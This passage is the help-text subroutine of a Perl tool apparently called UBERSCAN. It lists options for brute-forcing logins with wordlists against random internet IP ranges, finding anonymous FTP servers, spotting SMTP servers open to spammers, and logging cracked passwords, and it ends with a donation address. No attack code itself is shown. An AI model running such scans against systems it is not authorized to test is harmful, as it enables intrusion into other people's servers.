	print "\n";
	print "\n   -ipsingle:192.168.0.1 ";
	print "\n As above only use single ip - very powerful if used with wordlists!";
	print "\n";
	print "\n   -random_ip";
	print "\n As above, only use a random ip (WARNING- unless timed-out with the -maxmins:";
	print "\n option, this means uberscan NEVER STOPS RUNNING)";
	print "\n";
	print "\n   -random_ipblock:nn.nn";
	print "\n As random_ip, only within a /16 or /8 ipblock. For your comfort & convenience";
	print "\n you need not add the /nn rider; just the first one or two digits of the ipblock";
	print "\n you want to randomly scan.";
	print "\n";
	print "\n   -ipfile:filename.txt";
	print "\n Get ip addresses from file filename.txt";
	print "\n";
	print "\n   -max_retries:nn";
	print "\n Adjusts maxretries to number specified (default is $max_retries). Helpful on long runs!";
	print "\n ";
	print "\n   -ftpanon ";
	print "\n Searh for anonymous ftp servers. Used instead of -scantype and -user -pass";
	print "\n";
	print "\n   -smtpbug";
	print "\n Tests for the smtp bug. Used instead of -scantype and -user -pass options";
	print "\n";
	print "\n   -whois ";
	print "\n When a correct password is found, does a WHOIS query on the IP address. Off by default.";
	print "\n";
	print "\n   -forktimes:nn";
	print "\n This causes the random_ip routine to run in parallel, meaning you can look at";
	print "\n more IP addresses. Use with caution: 10 or so should be fine. May not be as";
	print "\n efficient as running multiple instances in single-task mode using the '&' rider";
	print "\n ";
	print "\n   -maxmins:nn";
	print "\n Stop program after xx minutes- Good when you want to conserve bandwidth outside";
	print "\n of certain hours, esp. in combination with random_ip options (May run a little"; 
	print "\n bit longer, especially with long timeouts or when '-forktimes:nn' option used).";
	print "\n";
	print "\n   -noportscan";
	print "\n Don't test to see if the target port's open before trying to hack it.";
	print "\n Useful if you're using proxychains or similar. NB This is ON by default.";
	print "\n";
#	print "\n   -save_to_passfile:filename.txt ";
#	print "\n Save all cracked passwords to filename.txt. Make sure you don't accidentally";
#	print "\n your wordlists! (it happens to us all...)";
#	print "\n";
	print "\n   -debug";
	print "\n Logs all failed login attempts, as well as some connection errors and webpages ";
	print "\n in HTML mode";
	print "\n";
	print "\n   -logall";
	print "\n Log ALL connection errors, even the most commonplace ones (implies -debug)";
	print "\n";
	print "\n   -timeout:nn ";
	print "\n Sets timeout in seconds for connection attempts (except HTTP). Default is $timeout.";
	print "\n";
	print "\n   -portscan_timeout:nn";
	print "\n Sets the timeout in seconds for the port scanner. Default is 1.";
	print "\n";
	print "\n   -pause";
	print "\n Pauses UBERSCAN after processing inputs so you can check you've set it up";
	print "\n correctly. Off by default.";
	print "\n ";
	print "\n   -spamcheck";
	print "\n Only works under \"-scantype:smtp\" scans. EVERY time a server is connected";
	print "\n to, it checks to see if it's vulnerable to abuse by spammers. Off by default.";
	print "\n";
	print "\n   -novrfy";
	print "\n When doing an SMTP scan, stops UBERSCAN from issuing VRFY commands.";
	print "\n Implies -spamcheck.";
	print "\n";
	print "\n   -csv";
	print "\n Output all files (except downloaded webpages) as CSV (comma-seperated values).";
	print "\n Data output is: Process ID,Scantype,IP,Port,username,password,minutesup";
	print "\n";
	print "\n   -gpl";
	print "\n GPL public licence that this program is distrubuted under. Really gripping";
	print "\n stuff. Basically it says you're not allowed to rip off this program and say";
	print "\n it's your own, but you can distribute it, modify it, and even charge for";
	print "\n copies if you like- AS LONG AS I GET THE CREDIT FOR WRITING THE THE ORIGINAL!";
	print "\n";
	print "\n By default, scan seeks ip addresses from a file called ipnumbers.txt,";
	print "\n so ensure that this exists unless yer using ipblock/range/random_ip/file opts";
	print "\n OTOH wordlist.txt can be any file. ";
	print "\n\n";
	print " This software would like you to pay the starving artist who wrote it.";
	print "\n Bitcoin and millibitcoin alike to:";
	print "\n\n 1PEDKUiUTxGNJ3XTPfXCTAjpzVzX1VZAme";
	print "\n\n Business and professional users in particular are encouraged to pay so ";
	print "\n that I can update this and write more sweet software.";
	print "\n Suggested donation: US\$10 equivelant would be nice, but I'll take what I can get.";
	print "\n";
	print "\n As of Feb 2020 I can be contacted at batchmcnulty\@protonmail.com.";	
	print "\n";
}

################################ END OF SUBROUTINES ####################################






